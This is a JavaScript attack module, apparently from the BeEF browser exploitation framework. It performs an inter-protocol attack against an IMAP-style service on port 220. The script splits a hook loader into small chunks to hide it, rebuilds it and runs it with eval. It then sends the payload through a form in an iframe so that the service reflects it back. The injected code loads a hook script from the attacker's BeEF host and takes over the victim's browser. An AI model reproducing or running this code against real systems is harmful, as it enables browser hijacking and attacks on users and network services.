var target_ip = 'IP_ADDRESS';
var target_port = '220';
var payload = "";

var scr_l = '<scr' + 'ipt\>';
var scr_r = '</scr' + 'ipt>';
var max_line_len = 23;

function add_line(cmd) {
	payload += scr_l + cmd + scr_r + "\\\n";
}

function construct_js(js) {
	add_line("a=''");

	js = js.replace(/ /g, "SP")

	for(i=0; i<js.length; i+=max_line_len) {
		add_line("a+=\\\""+js.substring(i,i+max_line_len)+"\\\"");
	} 

	add_line("s=String.fromCharCode(0x20)");
	add_line("a=a.replace(/SP/g,s)");
}

var code = "";
function add_js(js) {
	code+=js+";";
}

add_js("var result_id='" + result_id + "'"); 

add_js("function include(script_filename) {");
add_js("var html_doc = document.getElementsByTagName('head').item(0);");
add_js("var js = document.createElement('script');");
add_js("js.src = script_filename;");
add_js("js.type = 'text/javascript';");
add_js("js.defer = true;");
add_js("html_doc.appendChild(js);");
add_js("return js;");
add_js("}");

add_js("include('" + beef_url + "' + '/hook/ipc_imap.js.php');"); 
construct_js(code);
add_line("eval(a)");
add_line("//__END__");
payload += "COMMAND";

var iframe = document.createElement("iframe");
iframe.setAttribute("id","iwindow");
//iframe.setAttribute("style", "visibility:hidden;");
document.body.appendChild(iframe);

function do_submit(ip, port, content) {
	myform=document.createElement("form");
	myform.setAttribute("name","data");
	myform.setAttribute("method","post");
	myform.setAttribute("enctype", "multipart/form-data");

	myform.setAttribute("action","http://" + ip + 
	   ":" + port + "/abc.html");
	document.getElementById("iwindow").contentWindow.document.body.appendChild(myform); 

	myExt = document.createElement("INPUT");
	myExt.setAttribute("id","extNo");
	myExt.setAttribute("name","test");
	myExt.setAttribute("value",content); 
	myform.appendChild(myExt); 

	myform.submit();
}

do_submit(target_ip, target_port, payload);

